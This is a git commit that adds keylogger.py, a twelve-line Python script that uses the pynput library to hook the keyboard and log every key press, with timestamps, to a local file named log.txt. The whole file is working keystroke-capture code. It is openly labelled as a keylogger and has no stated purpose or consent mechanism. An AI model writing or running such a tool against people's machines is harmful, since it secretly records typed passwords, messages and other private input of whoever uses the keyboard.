de01d3f99461056a2a076de6a95f423c6ef01705
vshst <70687738+vshst@users.noreply.github.com>
2022-08-26 16:08:26 +0530

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,12 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+#basic configuration, format of the keylog file
+logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+#function define
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
